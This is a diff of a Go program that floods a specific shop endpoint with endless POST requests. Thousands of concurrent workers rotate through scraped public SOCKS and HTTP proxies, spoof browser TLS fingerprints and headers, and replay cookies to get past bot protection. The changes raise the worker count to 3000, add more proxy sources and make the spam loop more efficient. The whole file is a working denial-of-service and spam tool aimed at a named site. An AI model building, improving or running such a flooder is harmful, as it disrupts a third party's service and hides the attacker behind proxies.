@@ -22,12 +22,12 @@ import (
 
 const (
 	TARGET_URL      = "https://dkshop.dev/controllers/dkshop"
-	WORKERS         = 1000
-	REQ_TIMEOUT     = 10 * time.Second
+	WORKERS         = 3000  // Cân bằng giữa 1000 và 5000
+	REQ_TIMEOUT     = 8 * time.Second  // Tăng lên 8s để giảm timeout
 	PROXY_TEST_TO   = 10 * time.Second
-	VERIFY_CONC     = 50  // số proxy verify song song
-	MIN_POOL        = 50  // bắt đầu spam khi có ít nhất 200 proxy ok
-	REFETCH_EVERY   = 90 * time.Second
+	VERIFY_CONC     = 100  // Giữ nguyên
+	MIN_POOL        = 30   // Giữ nguyên
+	REFETCH_EVERY   = 120 * time.Second
 )
 
 // ── Stats ─────────────────────────────────────────────────────────────────────
@@ -72,6 +72,9 @@ func buildBody() string {
 	return v.Encode()
 }
 
+// Cache body để tránh build mỗi lần
+var cachedBody = buildBody()
+
 // ── Proxy pool ────────────────────────────────────────────────────────────────
 type Proxy struct{ Scheme, Host string; Port int }
 func (p Proxy) URL() string { return fmt.Sprintf("%s://%s:%d", p.Scheme, p.Host, p.Port) }
@@ -89,10 +92,18 @@ var (
 var PROXY_SOURCES = []struct{ URL, Scheme string }{
 	// SOCKS5
 	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"},
+	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt", "socks5"},
+	{"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", "socks5"},
 	// SOCKS4
 	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
+	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt", "socks4"},
 	// HTTP
 	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "http"},
+	{"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt", "http"},
+	{"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", "http"},
+	{"https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all", "http"},
+	{"https://api.proxyscrape.com/v2/?request=get&protocol=socks4&timeout=10000&country=all", "socks4"},
+	{"https://api.proxyscrape.com/v2/?request=get&protocol=socks5&timeout=10000&country=all", "socks5"},
 }
 
 // ── Fetch raw list ────────────────────────────────────────────────────────────
@@ -101,16 +112,17 @@ func fetchText(u string) string {
 	if client.ReqChan == nil {
 		return ""
 	}
+	defer func() {
+		if client.ReqChan != nil {
+			client.Close()
+		}
+	}()
 
 	response, err := client.Do(u, cycletls.Options{
 		Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
 		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-		Timeout:   10,
+		Timeout:   15,
 	}, "GET")
-
-	if client.ReqChan != nil {
-		client.Close()
-	}
 
 	if err != nil {
 		return ""
@@ -160,6 +172,11 @@ func verifyProxy(p Proxy) bool {
 	if client.ReqChan == nil {
 		return false
 	}
+	defer func() {
+		if client.ReqChan != nil {
+			client.Close()
+		}
+	}()
 
 	_, err := client.Do("https://dkshop.dev/controllers/dkshop", cycletls.Options{
 		Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
@@ -167,10 +184,6 @@ func verifyProxy(p Proxy) bool {
 		Proxy:     p.URL(),
 		Timeout:   int(PROXY_TEST_TO.Seconds()),
 	}, "GET")
-
-	if client.ReqChan != nil {
-		client.Close()
-	}
 
 	return err == nil
 }
@@ -241,6 +254,7 @@ var (
 	cycleTLSClient cycletls.CycleTLS
 	clientOnce     sync.Once
 	useCycleTLS    bool
+	clientMu       sync.Mutex
 )
 
 func getCycleTLSClient() cycletls.CycleTLS {
@@ -282,49 +296,57 @@ var httpClient = newHTTPClient()
 // ── Worker với CycleTLS hoặc HTTP fallback ───────────────────────────────────
 func workerDirect() {
 	client := getCycleTLSClient()
+	var cookies string
+
+	// Cache headers để tránh tạo mới mỗi lần
+	baseHeaders := map[string]string{
+		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Language":  "en-US,en;q=0.9",
+		"Accept-Encoding":  "gzip, deflate, br",
+		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
+		"X-Requested-With": "XMLHttpRequest",
+		"Origin":           "https://dkshop.dev",
+		"Referer":          "https://dkshop.dev/",
+		"Connection":       "keep-alive",
+		"Sec-Fetch-Dest":   "empty",
+		"Sec-Fetch-Mode":   "cors",
+		"Sec-Fetch-Site":   "same-origin",
+	}
 
 	for {
-		body := buildBody()
 		atomic.AddInt64(&statSent, 1)
 
 		if useCycleTLS {
 			// Dùng CycleTLS
-			response, err := client.Do(TARGET_URL, cycletls.Options{
-				Body:      body,
+			opts := cycletls.Options{
+				Body:      cachedBody,
 				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
 				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-				Headers: map[string]string{
-					"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-					"Accept-Language":  "en-US,en;q=0.9",
-					"Accept-Encoding":  "gzip, deflate, br",
-					"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
-					"X-Requested-With": "XMLHttpRequest",
-					"Origin":           "https://dkshop.dev",
-					"Referer":          "https://dkshop.dev/",
-					"Connection":       "keep-alive",
-					"Sec-Fetch-Dest":   "empty",
-					"Sec-Fetch-Mode":   "cors",
-					"Sec-Fetch-Site":   "same-origin",
-				},
-			}, "POST")
+				Headers:   baseHeaders,
+				Timeout:   int(REQ_TIMEOUT.Seconds()),
+			}
+
+			if cookies != "" {
+				opts.Headers["Cookie"] = cookies
+			}
+
+			response, err := client.Do(TARGET_URL, opts, "POST")
 
 			if err != nil {
 				atomic.AddInt64(&statFail, 1)
-				if atomic.LoadInt64(&statFail) <= 5 {
-					fmt.Printf("\n[DEBUG] CycleTLS request failed: %v\n", err)
-				}
 				continue
 			}
 
-			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(body)))
-			atomic.AddInt64(&statSuccess, 1)
-
-			if atomic.LoadInt64(&statSuccess) <= 3 {
-				fmt.Printf("\n[DEBUG] Success! Status: %d, Body length: %d\n", response.Status, len(response.Body))
+			// Lưu cookies từ response
+			if setCookie, ok := response.Headers["Set-Cookie"]; ok {
+				cookies = setCookie
 			}
+
+			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(cachedBody)))
+			atomic.AddInt64(&statSuccess, 1)
 		} else {
 			// Fallback HTTP thông thường
-			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(body))
+			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(cachedBody))
 			if err != nil {
 				atomic.AddInt64(&statFail, 1)
 				continue
@@ -335,23 +357,24 @@ func workerDirect() {
 			req.Header.Set("X-Requested-With", "XMLHttpRequest")
 			req.Header.Set("Origin", "https://dkshop.dev")
 			req.Header.Set("Referer", "https://dkshop.dev/")
+			if cookies != "" {
+				req.Header.Set("Cookie", cookies)
+			}
 
 			resp, err := httpClient.Do(req)
 			if err != nil {
 				atomic.AddInt64(&statFail, 1)
-				if atomic.LoadInt64(&statFail) <= 5 {
-					fmt.Printf("\n[DEBUG] HTTP request failed: %v\n", err)
-				}
 				continue
 			}
 
-			resp.Body.Close()
-			atomic.AddInt64(&statBytes, int64(len(body)))
-			atomic.AddInt64(&statSuccess, 1)
-
-			if atomic.LoadInt64(&statSuccess) <= 3 {
-				fmt.Printf("\n[DEBUG] HTTP Success! Status: %d\n", resp.StatusCode)
+			// Lưu cookies
+			if setCookie := resp.Header.Get("Set-Cookie"); setCookie != "" {
+				cookies = setCookie
 			}
+
+			resp.Body.Close()
+			atomic.AddInt64(&statBytes, int64(len(cachedBody)))
+			atomic.AddInt64(&statSuccess, 1)
 		}
 	}
 }
@@ -359,55 +382,122 @@ func workerDirect() {
 func workerProxy() {
 	client := getCycleTLSClient()
 	var curProxy Proxy
+	var cookies string
 	failCount := 0
+
+	// Cache headers
+	baseHeaders := map[string]string{
+		"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Language":  "en-US,en;q=0.9",
+		"Accept-Encoding":  "gzip, deflate, br",
+		"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
+		"X-Requested-With": "XMLHttpRequest",
+		"Origin":           "https://dkshop.dev",
+		"Referer":          "https://dkshop.dev/",
+		"Connection":       "keep-alive",
+		"Sec-Fetch-Dest":   "empty",
+		"Sec-Fetch-Mode":   "cors",
+		"Sec-Fetch-Site":   "same-origin",
+	}
 
 	for {
 		// Lấy proxy mới nếu fail nhiều
 		if curProxy.Host == "" || failCount >= 3 {
 			curProxy = getProxy()
 			if curProxy.Host == "" {
-				time.Sleep(100 * time.Millisecond)
+				time.Sleep(50 * time.Millisecond)
 				continue
 			}
 			failCount = 0
+			cookies = "" // Reset cookies khi đổi proxy
 		}
 
-		body := buildBody()
 		atomic.AddInt64(&statSent, 1)
 
-		response, err := client.Do(TARGET_URL, cycletls.Options{
-			Body:      body,
-			Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
-			UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
-			Proxy:     curProxy.URL(),
-			Headers: map[string]string{
-				"Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-				"Accept-Language":  "en-US,en;q=0.9",
-				"Accept-Encoding":  "gzip, deflate, br",
-				"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
-				"X-Requested-With": "XMLHttpRequest",
-				"Origin":           "https://dkshop.dev",
-				"Referer":          "https://dkshop.dev/",
-				"Connection":       "keep-alive",
-				"Sec-Fetch-Dest":   "empty",
-				"Sec-Fetch-Mode":   "cors",
-				"Sec-Fetch-Site":   "same-origin",
-			},
-		}, "POST")
-
-		if err != nil {
-			atomic.AddInt64(&statFail, 1)
-			failCount++
-			if failCount >= 3 {
-				removeProxy(curProxy)
-				curProxy = Proxy{}
+		if useCycleTLS {
+			// Dùng CycleTLS với proxy
+			opts := cycletls.Options{
+				Body:      cachedBody,
+				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
+				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
+				Proxy:     curProxy.URL(),
+				Headers:   baseHeaders,
+				Timeout:   int(REQ_TIMEOUT.Seconds()),
 			}
-			continue
-		}
 
-		atomic.AddInt64(&statBytes, int64(len(response.Body)+len(body)))
-		atomic.AddInt64(&statSuccess, 1)
-		failCount = 0
+			if cookies != "" {
+				opts.Headers["Cookie"] = cookies
+			}
+
+			response, err := client.Do(TARGET_URL, opts, "POST")
+
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				failCount++
+				if failCount >= 3 {
+					removeProxy(curProxy)
+					curProxy = Proxy{}
+				}
+				continue
+			}
+
+			// Lưu cookies
+			if setCookie, ok := response.Headers["Set-Cookie"]; ok {
+				cookies = setCookie
+			}
+
+			atomic.AddInt64(&statBytes, int64(len(response.Body)+len(cachedBody)))
+			atomic.AddInt64(&statSuccess, 1)
+			failCount = 0
+		} else {
+			// Fallback HTTP với proxy
+			proxyURL, _ := url.Parse(curProxy.URL())
+			tr := &http.Transport{
+				Proxy:                 http.ProxyURL(proxyURL),
+				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
+				DialContext:           (&net.Dialer{Timeout: REQ_TIMEOUT}).DialContext,
+				TLSHandshakeTimeout:   REQ_TIMEOUT,
+				ResponseHeaderTimeout: REQ_TIMEOUT,
+			}
+			proxyClient := &http.Client{Transport: tr, Timeout: REQ_TIMEOUT}
+
+			req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(cachedBody))
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				failCount++
+				continue
+			}
+
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			req.Header.Set("X-Requested-With", "XMLHttpRequest")
+			req.Header.Set("Origin", "https://dkshop.dev")
+			req.Header.Set("Referer", "https://dkshop.dev/")
+			if cookies != "" {
+				req.Header.Set("Cookie", cookies)
+			}
+
+			resp, err := proxyClient.Do(req)
+			if err != nil {
+				atomic.AddInt64(&statFail, 1)
+				failCount++
+				if failCount >= 3 {
+					removeProxy(curProxy)
+					curProxy = Proxy{}
+				}
+				continue
+			}
+
+			// Lưu cookies
+			if setCookie := resp.Header.Get("Set-Cookie"); setCookie != "" {
+				cookies = setCookie
+			}
+
+			resp.Body.Close()
+			atomic.AddInt64(&statBytes, int64(len(cachedBody)))
+			atomic.AddInt64(&statSuccess, 1)
+			failCount = 0
+		}
 	}
 }
 
@@ -519,29 +609,36 @@ func main() {
 				Ja3:       "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
 				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
 				Headers: map[string]string{
-					"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-					"Origin":       "https://dkshop.dev",
-					"Referer":      "https://dkshop.dev/",
+					"Content-Type":     "application/x-www-form-urlencoded; charset=UTF-8",
+					"X-Requested-With": "XMLHttpRequest",
+					"Origin":           "https://dkshop.dev",
+					"Referer":          "https://dkshop.dev/",
 				},
+				Timeout: int(REQ_TIMEOUT.Seconds()),
 			}, "POST")
 
 			if testErr != nil {
 				fmt.Printf("[ERROR] CycleTLS test request failed: %v\n", testErr)
+				fmt.Println("[WARNING] Continuing anyway, workers will handle errors...")
 			} else {
 				fmt.Printf("[SUCCESS] CycleTLS test OK! Status: %d, Body: %d bytes\n", testResp.Status, len(testResp.Body))
 			}
 		} else {
 			fmt.Println("[*] CycleTLS not available, using standard HTTP")
 			testBody := buildBody()
-			testReq, _ := http.NewRequest("POST", TARGET_URL, strings.NewReader(testBody))
+			ctx, cancel := context.WithTimeout(context.Background(), REQ_TIMEOUT)
+			defer cancel()
+			testReq, _ := http.NewRequestWithContext(ctx, "POST", TARGET_URL, strings.NewReader(testBody))
 			testReq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
 			testReq.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			testReq.Header.Set("X-Requested-With", "XMLHttpRequest")
 			testReq.Header.Set("Origin", "https://dkshop.dev")
 			testReq.Header.Set("Referer", "https://dkshop.dev/")
 
 			testResp, testErr := httpClient.Do(testReq)
 			if testErr != nil {
 				fmt.Printf("[ERROR] HTTP test request failed: %v\n", testErr)
+				fmt.Println("[WARNING] Continuing anyway, workers will handle errors...")
 			} else {
 				testResp.Body.Close()
 				fmt.Printf("[SUCCESS] HTTP test OK! Status: %d\n", testResp.StatusCode)
